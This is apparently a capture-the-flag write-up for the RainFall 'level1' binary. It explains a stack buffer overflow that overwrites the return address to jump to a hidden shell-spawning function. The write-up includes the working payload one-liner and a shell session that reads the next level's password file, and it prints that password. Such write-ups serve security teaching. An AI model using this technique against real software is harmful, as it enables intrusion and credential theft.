### Exploit

First, what do we see when we test the executable? On the face of it, the programme expects some user input and then leaves.
Indeed, there's not much more to it.

```
    (gdb) disas main
    Dump of assembler code for function main:
       0x08048480 <+0>:	push   ebp
       0x08048481 <+1>:	mov    ebp,esp
       0x08048483 <+3>:	and    esp,0xfffffff0
       0x08048486 <+6>:	sub    esp,0x50
       0x08048489 <+9>:	lea    eax,[esp+0x10]
       0x0804848d <+13>:	mov    DWORD PTR [esp],eax
       0x08048490 <+16>:	call   0x8048340 <gets@plt>
       0x08048495 <+21>:	leave
       0x08048496 <+22>:	ret
    End of assembler dump.
```
Thankfully, there's another function which isn't called anywhere in <main>; that is <run>. This function is interesting, as it makes a syscall and spawns a shell! However, how do we get to execute a function that's not called at all? This is when we first introduce the notion of "payload". An exploit is a piece of code written to take advantage of a particular vulnerability. A payload is a piece of code to be executed through said exploit. The exploit in our case is the well-known bufferover flow. Therefore, we want to write a payload which'll exploit this vulnerabilty. A buffer of size 76 is instantiated at the beginning of the programme. Giviing the programme a string bigger than said size will result in a segfault.

The address of <run> is `0x08048444`. 

```
    level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/payload
    level1@RainFall:~$ cat /tmp/payload - | ./level1
    Good... Wait what?
    cat /home/user/level2/.pass
    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Most upcoming exploits look like this one, more or less, so let's keep this mind.
